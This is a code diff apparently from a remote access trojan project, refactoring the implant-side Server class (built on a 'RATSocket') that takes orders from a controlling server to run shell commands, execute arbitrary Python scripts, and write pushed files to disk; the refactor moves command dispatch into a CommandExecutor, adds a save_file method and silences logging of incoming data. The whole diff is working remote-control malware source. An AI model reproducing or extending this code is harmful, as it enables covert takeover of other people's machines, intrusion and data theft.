@@ -1,16 +1,16 @@
-import inspect
 import ntpath
 import os
 
-from client.command import Command
+from client.util.command import CommandExecutor
 from common.ratsocket import RATSocket
-from common.util import logger, get_input_stream, get_output_stream, parse
+from common.util import logger, get_input_stream, get_output_stream
 
 
 class Server(RATSocket):
 
     def __init__(self):
         super().__init__()
+        self.command_executor = CommandExecutor(self)
 
     def send_result(self, id: int, status: int, result: str, eof: int = 1):
         """
@@ -55,50 +55,37 @@ class Server(RATSocket):
         :return: 结果id，状态，结果
         """
         data = self.recv()
-        logger.info(data)
-        id = data['id']
-        type = data['type']
+        # logger.info(data)
+        id = data.get('id')
+        type = data.get('type')
         try:
             # 如果是命令
             if type == 'command':
-                command = data['text']
-                name, arg = parse(command)
-                if hasattr(Command, name):
-                    func = getattr(Command, name)
-                    params = inspect.getfullargspec(func).args
-                    if not len(params):
-                        result = func()
-                    else:
-                        if '_instance' in params:
-                            if len(params) == 1:
-                                result = func(_instance=(id, self))
-                            else:
-                                result = func(arg, _instance=(id, self))
-                        else:
-                            result = func(arg)
-                    if result:
-                        result = result[0], result[1] + '\n'
-                else:
-                    result = Command.shell(command)
+                result = self.command_executor.execute_command(id, data.get('text'))
                 if result:
                     return id, *result
+
             # 如果是Python脚本
             if type == 'script':
-                return id, *Command.pyexec(data['text'], kwargs=data.get('extra'))
+                return id, *self.command_executor.pyexec(data['text'], kwargs=data.get('extra'))
+
             # 如果是文件
             elif type == 'file':
-                filename = os.path.abspath(data['filename'])
-                try:
-                    io = get_input_stream(filename)
-                except Exception as e:
-                    self.send_signal(0)
-                    return id, 0, str(e)
-                try:
-                    self.send_signal(1)
-                    self.recv_io(data['length'], io)
-                    return id, 1, f'File uploaded to: {os.path.abspath(filename)}'
-                except Exception as e:
-                    logger.error(f'Error receiving file from server: {e}')
+                return id, *self.save_file(data.get('filename'), data.get('length'))
         except Exception as e:
             logger.error(e, exc_info=True)
             return id, 0, f'{e}\n'
+
+    def save_file(self, filename, length):
+        file = os.path.abspath(filename)
+        try:
+            io = get_input_stream(file)
+        except Exception as e:
+            self.send_signal(0)
+            return 0, str(e)
+        try:
+            self.send_signal(1)
+            self.recv_io(length, io)
+            return 1, f'File uploaded to: {os.path.abspath(file)}'
+        except Exception as e:
+            logger.error(f'Error receiving file from server: {e}')
